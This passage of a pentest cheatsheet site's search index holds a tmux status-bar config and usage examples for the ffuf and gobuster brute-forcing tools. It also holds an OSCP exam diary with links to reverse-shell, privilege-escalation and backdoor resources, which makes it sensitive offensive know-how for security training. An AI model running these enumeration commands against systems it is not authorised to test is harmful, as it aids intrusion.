address on left side of status bar set -g status-right-length 300 set -g status-right \"#[fg=#7400ff] #([ -d /proc/sys/net/ipv4/conf/eth0 ] &amp;&amp; ip addr show dev eth0 | grep \"inet[^6]\" | awk '{print \\\"eth0: \\\" $2}') #[fg=#ff00ff] #([ -d /proc/sys/net/ipv4/conf/wlan0 ] &amp;&amp; ip addr show dev wlan0 | grep \"inet[^6]\" | awk '{print \\\"wlan0: \\\" $2}') #[fg=#d70000] #([ -d /proc/sys/net/ipv4/conf/tun0 ] &amp;&amp; ip addr show dev tun0 | grep \"inet[^6]\" | awk '{print \\\"tun0: \\\" $2}') #[fg=black] \\\"#{=22:pane_title}\\\" %H:%M %d-%b-%y\" . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/cheatsheet/Terms%20&%20Editors/Tmux/",
    "relUrl": "/cheatsheet/Terms%20&%20Editors/Tmux/"
  },"44": {
    "doc": "Tmux",
    "title": "Tmux",
    "content": "29 May 2021 . ",
    "url": "https://maoutis.github.io/cheatsheet/Terms%20&%20Editors/Tmux/",
    "relUrl": "/cheatsheet/Terms%20&%20Editors/Tmux/"
  },"45": {
    "doc": "Web Busting & Fuzzing",
    "title": "Web busting &amp; Fuzzing",
    "content": "List of cheatsheet for various web busting and fuzzing tools: . | ffuf . | gobuster . | . ",
    "url": "https://maoutis.github.io/cheatsheet/Web%20Busting%20&%20Fuzzing/#web-busting--fuzzing",
    "relUrl": "/cheatsheet/Web%20Busting%20&%20Fuzzing/#web-busting--fuzzing"
  },"46": {
    "doc": "Web Busting & Fuzzing",
    "title": "Web Busting & Fuzzing",
    "content": " ",
    "url": "https://maoutis.github.io/cheatsheet/Web%20Busting%20&%20Fuzzing/",
    "relUrl": "/cheatsheet/Web%20Busting%20&%20Fuzzing/"
  },"47": {
    "doc": "ffuf",
    "title": "Web Busting &amp; Fuzzing - ffuf",
    "content": "#ffuf #subdomain-busting #vhost-busting #web-busting . | About | Options list . | General options | Filters | Input/Output | . | Usage examples | . About . ffuf - Fuzz Faster U Fool . A fast web fuzzer written in Go. Official Repository: https://github.com/ffuf/ffuf . Options list . General options . Filters . Input/Output . Usage examples . # Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42. # Colored, verbose output. ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz Host-header, match HTTP 200 responses. ffuf -w hosts.txt -u https://example.org/ -H \"Host: FUZZ\" -mc 200 # Fuzz POST JSON data. Match all responses not containing text \"error\". ffuf -w entries.txt -u https://example.org/ -X POST -H \"Content-Type: application/json\" \\ -d '{\"name\": \"FUZZ\", \"anotherkey\": \"anothervalue\"}' -fr \"error\" . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/cheatsheet/Web%20Busting%20&%20Fuzzing/ffuf/",
    "relUrl": "/cheatsheet/Web%20Busting%20&%20Fuzzing/ffuf/"
  },"48": {
    "doc": "ffuf",
    "title": "ffuf",
    "content": "29 May 2021 . ",
    "url": "https://maoutis.github.io/cheatsheet/Web%20Busting%20&%20Fuzzing/ffuf/",
    "relUrl": "/cheatsheet/Web%20Busting%20&%20Fuzzing/ffuf/"
  },"49": {
    "doc": "gobuster",
    "title": "Web Busting &amp; Fuzzing - gobuster",
    "content": "#gobuster #subdomain-busting #vhost-busting #web-busting . | About | General usage . | dir usage | dns usage | vhost usage | . | . About . Directory/File, DNS and VHost busting tool written in Go . Gobuster is a tool used to brute-force: . | URIs (directories and files) in web sites. | DNS subdomains (with wildcard support). | Virtual Host names on target web servers. | Open Amazon S3 buckets | . Official Repository: https://github.com/OJ/gobuster . General usage . ‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/post-expl/windows/SysinternalsSuite] ‚îî‚îÄ$ gobuster Usage: gobuster [command] Available Commands: dir Uses directory/file brutceforcing mode dns Uses DNS subdomain bruteforcing mode help Help about any command vhost Uses VHOST bruteforcing mode Flags: -h, --help help for gobuster -z, --noprogress Don't display progress -o, --output string Output file to write results to (defaults to stdout) -q, --quiet Don't print the banner and other noise -t, --threads int Number of concurrent threads (default 10) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist Use \"gobuster [command] --help\" for more information about a command. dir usage . # Common directory enumeration gobuster dir -u http://10.11.1.73:8080/php/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -t 20 -f -o phpDir.txt . dns usage . # Common sub-domain enumeration gobuster dns -d delivery.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -o sub-domain.txt . vhost usage . # Common virtual hosts enumeration gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://dms-pit.htb/ -t 25 -o vhosts.txt . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/cheatsheet/Web%20Busting%20&%20Fuzzing/gobuster/",
    "relUrl": "/cheatsheet/Web%20Busting%20&%20Fuzzing/gobuster/"
  },"50": {
    "doc": "gobuster",
    "title": "gobuster",
    "content": "29 May 2021 . ",
    "url": "https://maoutis.github.io/cheatsheet/Web%20Busting%20&%20Fuzzing/gobuster/",
    "relUrl": "/cheatsheet/Web%20Busting%20&%20Fuzzing/gobuster/"
  },"51": {
    "doc": "My OSCP Journey",
    "title": "My OSCP Journey",
    "content": "#OSCP #offsec #PWK #PEN-200 . Italian article available here . | Pre-course . | Backgrund and preparation | . | PEN-200 Course and Lab . | Day 01-30 | Day 31-60 | Day 61-90 | Up to the day before the exam | . | Day before the exam | Exam . | Day one | Day two | Exam history | . | Certificate | Overview | Useful resources . | OSCP general resources | Working with Shells | General purpose hacking resource | Linux specific resources . | Post Exploitation &amp; PrivEsc . | Methodology | Cheatsheet | Tools | . | . | Windows specific resources . | Post Exploitation &amp; PrivEsc . | Methodology | Cheatsheet | Tools | . | . | . | . Pre-course . Backgrund and preparation . When I enrolled in the PWK course, I had worked as a software developer for 2 years and had been working as a Penetration Tester for another 2 years. Prior to OSCP I had not yet obtained any certification, the only course I had taken was the eLearnSecurity‚Äôs PTSv4, but without attempting the related eJPT certification. Having been self-taught for about 4 years, playing HackTheBox from a while and now working in the industry from a couple of years, I already mastered the pre-requisites suggested by Offensive Security, so I decided to enroll. PEN-200 Course and Lab . I enrolled in the PEN-200 (PWK 2020) on the 15th of Jennuary 2021. The course then started on the 24th of Jenuary with 90 days of lab access. Day 01-30 . I spent the first month looking at the course material (850+ pdf pages and 17+ hours of video) and doing the exercises required to get the 5 bonus points during the exam. Although they were not difficult, the exercises were many and required a lot of time to be done correctly (to get the 5 bonus points the exercises must all be complete and correct), so I decided to start them from the first day. While reading the pdf I also began structuring notes and cheatsheets to use during the exam so that I would have all the useful references and commands ready at hand. Day 31-60 . Finally after 30 days of exercises and notes writing I was able to start hacking some boxes. I decided to start the journey following the PWK Labs Learning Path and then proceed autonomously with the ‚Äúlow hanging fruits‚Äù. In the meantime I took notes for each one of the machines penetrated and I wrote short writeups so that I would have an executive summary and a brief overview for each of them. Day 61-90 . During the last month of access to the lab I did the extra mile exercises and I hacked as many machines as possible, trying to maintain an average of 1 machine per day. At the end of the lab time I finished with 64 hacked machines (out of a total of about 70), one domain controller completely compromised and access to all 3 internal networks. Up to the day before the exam . Between the end of the course and the final exam I decided to let a month pass in order to have the necessary time to review or extend any doubts or knowledge in addition to writing the report of the lab (a complete writeup of 10 machines with different attack vector + all pdf exercises) to totalize the 5 additional points. In this month I have followed two Udemy courses focused on Windows Privilege Escalation (‚ÄúWindows Privilege Escalation for OSCP &amp; Beyond!‚Äù and ‚ÄúWindows Privilege Escalation for Beginners‚Äù) and I kept rooting as many machines as possible on HackTheBox (I already had a VIP subscription) inspired by the lists of OSCP like machines that can be found on the web. During each penetration test I always kept taking notes and writing writeups, in order to keep my second brain always updated and organized. I ended up with a total of 51 rooted machines on HTB: . | Lame - 10.10.10.3 | Legacy - 10.10.10.4 | Devel - 10.10.10.5 | Beep - 10.10.10.7 | Optimum - 10.10.10.8 | Bastard - 10.10.10.9 | Arctic - 10.10.10.11 | Grandpa - 10.10.10.14 | Granny - 10.10.10.15 | Blue - 10.10.10.40 | Shocker - 10.10.10.56 | Jeeves - 10.10.10.63 | Bashed - 10.10.10.68 | Chatterbox - 10.10.10.74 | DevOops - 10.10.10.91 | Bounty - 10.10.10.93 | Jerry - 10.10.10.95 | Active - 10.10.10.100 | SecNotes - 10.10.10.97 | Access - 10.10.10.98 | Querier - 10.10.10.125 | Netmon - 10.10.10.152 | Bastion - 10.10.10.134 | SwagShop - 10.10.10.140 | Writeup - 10.10.10.138 | Jarvis - 10.10.10.143 | Networked - 10.10.10.146 | Postman - 10.10.10.160 | Traverxec - 10.10.10.165 | Obscurity - 10.10.10.168 | OpenAdmin - 10.10.10.171 | Traceback - 10.10.10.181 | Magic - 10.10.10.185 | Admirer - 10.10.10.187 | Cache - 10.10.10.188 | Blunder - 10.10.10.191 | Tabby - 10.10.10.194 | Buff - 10.10.10.198 | Ready - 10.10.10.220 | Delivery - 10.10.10.222 | Tenet - 10.10.10.223 | ScriptKiddie - 10.10.10.226 | Ophiuchi - 10.10.10.227 | Spectra - 10.10.10.229 | TheNotebook - 10.10.10.230 | Armageddon - 10.10.10.233 | Schooled - 10.10.10.234 | Atom - 10.10.10.237 | Love - 10.10.10.239 | Pit - 10.10.10.241 | Knife - 10.10.10.242 | . To retrain my Buffer Overflow skills I also executed some exercises from the TryHackMe module Buffer Overflow Prep - Practice stack based buffer overflows!. Day before the exam . The day before the exam I stayed completely away from the hacking world and everything related to the certification. I rested, I had company, I had fun and I tried to sleep as much as possible in preparation for the big day (sleep that actually lacked because of the pressure). Exam . Day one . The exam started at 9am, the proctors were on point and I didn‚Äôt have any kind of problem with the VPN or accessing the platforms. I started right away with the BOF machine (while the scans were running on the other machines) and after about 1 hour and 45 minutes (yes, it took me longer than it should have according to my schedule) I got the first 25 points without any great difficulty. Afterwards, I decided to take a look at all the scans and tackle one of the two 20 points machines to take the pressure off. After about 3 hours I got the user and after other 45 minutes I got the full 20 points. At that point I decided to go ahead with the second 20 points machine. After 2 hours and 30 minutes I got the user flag but from there I got stuck on the privilege escalation process for about 1 hour and 15 minutes so that I decided to try to approach an easy win 10 points machine to restore a mental balance. The 10 points machine was really a peace of cake and it took me less than 30 minutes to root it. After the 10 points machine I decided to try and tackle the last missing box before going back to try the privilege escalation on the second Medium machine. After about 2 hours and 30 minutes of intense enumeration I got the user and after other 45 minutes I got the root flag. Sure to have totaled a good margin of points to pass the exam (‚âà90pt) I have decided to still try an hour of privilege escalation, however without success. In the remaining time of VPN access I double-checked all the notes, procedures, exploits and I took any missing screenshots. Around 1:00 AM I went to rest for about 4 hours and at 5:00 AM I started writing the final report. Day two . The second day was all downhill. The report (which I had already structured in the previous days) was just a sequence of copying and pasting from the notes and a bit of research for vulnerability remediation, but nothing more than that. At 12:27 I had already finished checking the report and I had already submitted it. Exam history . 08:30 - Proctoring stuff 09:00 - Exam started 10:43 - 25 points Buffer Overflow box rooted 12:35 - Lunch break (30 mins) 13:34 - 20 points box (1) user shell obtained 14:14 - 20 points box (1) rooted 16:43 - 20 points box (2) user shell obtained 18:26 - 10 points box rooted 19:30 - Dinner break (30 mins) 21:06 - 25 points box user shell obtained 22:00 - 25 points box rooted 01:05 - Rest 05:00 - Breakfast 05:30 - Started writing the final report 12:27 - Submitted the final report . Certificate . The day after the delivery of the Lab and Exam reports (01/06/2021 @ 13:12) I received the email confirming the achievement of the certification. Overview . My experience with this course and certification has been overall positive. Although I feel that the work required to obtain the 5 bonus points is excessively time-consuming (considering that access to the lab is activated from day 1 and that it is not possible to stop it) the experience in the lab was exceptional: 70 and more machines almost all different from each other, different Active Directories, different internal networks to reach, interdependencies between different machines. It was really fun! . PDF and videos are very well structured and clear, perhaps a little too redundant in the two versions (many times the videos merely repeated things seen in the pdf without further elaboration). Not a big deal anyway. The exam was challenging but fun. Reporting was not an issue. The key concepts for obtaining the certification are primarily three: . | Try harder (or rather ‚Äúenuemreate harder‚Äù)! | Organize your notes and cheatsheet properly | Google is your best friend | . If you can master these key concepts getting certified will be a breeze. Useful resources . OSCP general resources . | Offensive Security official web site | awesome-oscp: A curated list of awesome OSCP resources | OSCP/Pen Testing Resources | OSCP Repo: A list of commands, scripts, resources, and more that I have gathered and attempted to consolidate for use as OSCP (and more) study material. | . Working with Shells . | Pimp My Shell: 5 Ways to Upgrade a Netcat Shell | Upgrading Simple Shells to Fully Interactive TTYs | Reverse Shell Cheat Sheet (by HighOn.Coffee) | Reverse Shell Cheat Sheet (by pentestmonkey) | Shell Upgrade Cheat Sheet (by mlcsec) | Offensive Msfvenom: from Generating Shellcode to Creating Trojans | Msfvenom payload generation | . General purpose hacking resource . | HackTricks: the place where to find every hacking trick/technique/researches and news. | ippsec: ippsec video search | PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF | All About OSCP: find everything related to OSCP | OSCP preparation notes (by infosecsanyam) | Penetration Testing Tools Cheat Sheet (by HighOn.Coffee) | Penetration testing tools: A neat list of penetration testing (some red) tools with usage commands and examples for quick reference. Originally intended for OSCP students. | RTFM: A database of common, interesting or useful commands, in one handy referable form | Pentest-Cheatsheets (by Tib3rius) | . Linux specific resources . | pwk-cheatsheet/linux-template | Linux Snippets (by mlcsec) | Linux Commands Cheat Sheet (by HighOn.Coffee) | . Post Exploitation &amp; PrivEsc . | GTFOBins: a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. | 9 Ways to Backdoor a Linux Box | . Methodology . | Privilege Escalation Checklist (by swisskyrepo) | Privilege Escalation Checklist (by HackTricks) | Privilege Escalation Checklist (by infosecsanyam) | Basic Linux Privilege Escalation (by g0tmi1k) | . Cheatsheet . | Basic Linux Privilege Escalation (by g0tmi1k) | PayloadsAllTheThings - Linux Privilege Escalation | HackTricks - Linux Privilege Escalation | Privilege Escalation Cheatsheet (by 0xsp) | Awesome Privilege Escalation: A curated list of awesome privilege escalation | Ignitetechnologies/Privilege-Escalation : aimed at the CTF Players and Beginners to help them understand the fundamentals of Privilege Escalation with examples. | . Tools . | Linux Local Enumeration Script: performs basic linux local enumeration, a first step in the local privilege escalation process. | LinPEAS: a script that search for possible paths to escalate privileges on Linux/Unix* hosts. The checks are explained on book.hacktricks.xyz | linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels | unix-privesc-check: Shell script to check for simple privilege escalation vectors on Unix systems | LinEnum: Scripted Local Linux Enumeration &amp; Privilege Escalation Checks | LES (Linux Exploit Suggester): designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. | crontab guru: The quick and simple editor for cron schedule expressions by Cronitor | . Windows specific resources . | pwk-cheatsheet/windows-template | Windows Snippets (by mlcsec) | Basics of windows from total-oscp-guide | yeyintminthuhtut/Awesome-Red-Teaming: List of Awesome Red Teaming Resources | . Post Exploitation &amp; PrivEsc . | LOLBAS: every binary, script, and library that can be used for Living Off The Land techniques. | . Methodology . | Local Windows Privilege Escalation Checklist (by HackTricks) | Windows Privilege Escalation Guide (by absolomb) | Windows Privilege Escalation Fundamentals (by FuzzySecurity) | Windows Privilege Escalation Checklists (by netbiosX) | Local Windows Privilege Escalation Checklist (by infosecsanyam) | . Cheatsheet . | PayloadsAllTheThings - Windows Privilege Escalation | HackTricks - Windows Local Privilege Escalation | Windows Privilege Escalation Guide (by absolomb) | emilyanncr/Windows-Post-Exploitation : Windows post-exploitation tools, resources, techniques and commands to use during post-exploitation phase of penetration test. | red-team-cheatsheet (by 0xsp) | Privilege Escalation Cheatsheet (by 0xsp) | Windows Privilege Escalation Fundamentals (by FuzzySecurity) | Awesome Privilege Escalation: A curated list of awesome privilege escalation | . Tools . | Seatbelt: a C# project that performs a number of security oriented host-survey ‚Äúsafety checks‚Äù relevant from both offensive and defensive security perspectives. | WindowsEnum: A Powershell Privilege Escalation Enumeration Script. | winPEAS: WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz | PowerUp: a PowerShell tool to assist with local privilege escalation on Windows systems. It contains several methods to identify and abuse vulnerable services, as well as DLL hijacking opportunities, vulnerable registry settings, and escalation opportunities. | windows-privesc-check: Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems | Watson: Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities | Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. | Windows Exploit Suggester - Next Generation: a tool based on the output of Windows‚Äô systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. | Windows Exploit Suggester: compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. | GhostPack-Compiled Binaries: Compiled Binaries for Ghostpack (.NET v4.0) | Nishang: Nishang - Offensive PowerShell for red team, penetration testing and offensive security. | RottenPotatoNG: New version of RottenPotato as a C++ DLL and standalone C++ binary - no need for meterpreter or other tools. | Juicy Potato: A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. | UACME: Defeating Windows User Account Control | . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/posts/2021-06-04-My-OSCP-Journey/",
    "relUrl": "/posts/2021-06-04-My-OSCP-Journey/"
  },"52": {
    "doc": "My OSCP Journey",
    "title": "My OSCP Journey",
    "content": "04 Jun 2021 | Reading time: ~15 min . ",
    "url": "https://maoutis.github.io/posts/2021-06-04-My-OSCP-Journey/",
    "relUrl": "/posts/2021-06-04-My-OSCP-Journey/"
  }
}
